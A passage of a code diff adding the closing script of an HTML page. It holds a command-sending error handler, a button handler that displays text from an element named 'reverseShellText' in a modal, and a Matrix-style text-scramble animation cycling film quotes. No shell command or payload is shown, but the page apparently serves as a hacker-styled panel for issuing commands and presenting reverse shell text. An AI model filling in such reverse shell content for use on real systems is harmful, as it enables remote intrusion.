+		            console.error("Error sending command:", error);
+
+		            // Display a modal with a generic error message
+		            openModal("An unexpected error occurred.", true);
+		        });
+		}
+
+
+
+
+/**
+ * Function to handle button press and invoke a modal with the appropriate text.
+ * @param {number} shellId - The ID of the shell type associated with the button press.
+ */
+		function ButtonPress(shellId) {
+		    let text;
+		    
+		    // Check if the shell ID corresponds to a specific shell type
+		    if (shellId === 1) {
+		    
+		    	// Retrieve the text from the element with ID 'reverseShellText'
+		        text = document.getElementById('reverseShellText').innerText;
+
+		    }
+
+		    openModal(text);
+		}
+
+
+
+/**
+ * The TextScramble function emulates the iconic effect from The Matrix, where text 
+ * transitions through random characters before revealing the final message. 
+ * 
+ * The animation gradually replaces the current characters with random symbols from a 
+ * predefined set until it matches the target text. 
+ * 
+ * This dynamic effect resembles digital code decrypting in real time, creating a 
+ * visually striking "hacker-style" appearance.
+ */
+	class TextScramble {
+		constructor(el) {
+		    this.el = el
+		    
+		    // Characters for the scrambling effect
+		    this.chars = '!<>-_\\/[]{}—=+*^?#________'
+		    
+		    // Bind the update method
+		    this.update = this.update.bind(this)
+		}
+		
+		// Set the text to be displayed with a scramble effect
+		setText(newText) {
+		
+			// Get the current text
+		    const oldText = this.el.innerText
+		    
+		    // Determine the longest text length
+		    const length = Math.max(oldText.length, newText.length)
+		    
+		    // Promise for when animation completes
+		    const promise = new Promise((resolve) => this.resolve = resolve)
+		    this.queue = []
+		    for (let i = 0; i < length; i++) {
+		        const from = oldText[i] || ''								// Current character or empty
+		        const to = newText[i] || ''									// Target character or empty
+		        const start = Math.floor(Math.random() * 40)				// Random start frame
+		        const end = start + Math.floor(Math.random() * 40)			// Random end frame
+		        this.queue.push({ from, to, start, end });
+		    }
+		    
+		    // Stop any ongoing animation
+		    cancelAnimationFrame(this.frameRequest)
+		    this.frame = 0										// Reset the frame counter
+		    this.update()										// Start the update loop
+		    return promise										// Return the promise
+		}
+		
+		
+		// Update the text display
+		update() {
+		    let output = ''										// The updated text to display
+		    let complete = 0									// Count of completed characters
+		    
+		    for (let i = 0, n = this.queue.length; i < n; i++) {
+		        let { from, to, start, end, char } = this.queue[i];
+
+
+		        if (this.frame >= end) {
+		            complete++
+		            output += to								// Add the final character if animation is done
+		        } else if (this.frame >= start) {
+		            if (!char || Math.random() < 0.28) {
+		                char = this.randomChar()				// Generate a random character
+		                this.queue[i].char = char
+		            }
+		            output += `<span class="dud">${char}</span>`			// Display the scrambling character
+		        } else {
+		            output += from								// Add the original character if animation hasn't started
+		        }
+		    }
+		    
+		    // Update the element's HTML
+		    this.el.innerHTML = output
+		    
+		    
+		    if (complete === this.queue.length) {
+		        this.resolve()									// Resolve the promise if all characters are done
+		    } else {
+		        this.frameRequest = requestAnimationFrame(this.update)			// Continue the animation
+		        this.frame++
+		    }
+		}
+		
+    	// Generate a random character
+		randomChar() {
+		    return this.chars[Math.floor(Math.random() * this.chars.length)]
+		}
+	}
+
+
+
+	// Phrases
+	const phrases = [
+		'Neo,',
+		'sooner or later',
+		'you\'re going to realize',
+		'just as I did',
+		'that there\'s a difference',
+		'between knowing the path',
+		'and walking the path',
+		'The Matrix has you.',
+		'Free your mind.',
+		'There is no spoon.',
+		'What is real?',
+		'The one is not a savior, but a choice.',
+		'It’s not about understanding, it’s about believing.',
+		'Reality is just a matter of perception.',
+		'The red pill is the only way out.',
+		'You’ve been living in a dream world.'
+	]
+
+	const el = document.querySelector('.text')			// Target the element with class 'text'
+	const fx = new TextScramble(el)
+
+	let counter = 0										// Start with the first phrase
+	
+	// Function to cycle through the phrases
+	const next = () => {
+		fx.setText(phrases[counter]).then(() => {
+		
+			// Wait 3 seconds before the next phrase
+		    setTimeout(next, 3000)		
+		})
+		
+		// Loop back to the start when all phrases are done
+		counter = (counter + 1) % phrases.length
+	}
+
+	// Start the animation
+	next()
+</script>
+
+</div>
+</body>
+
+</html>
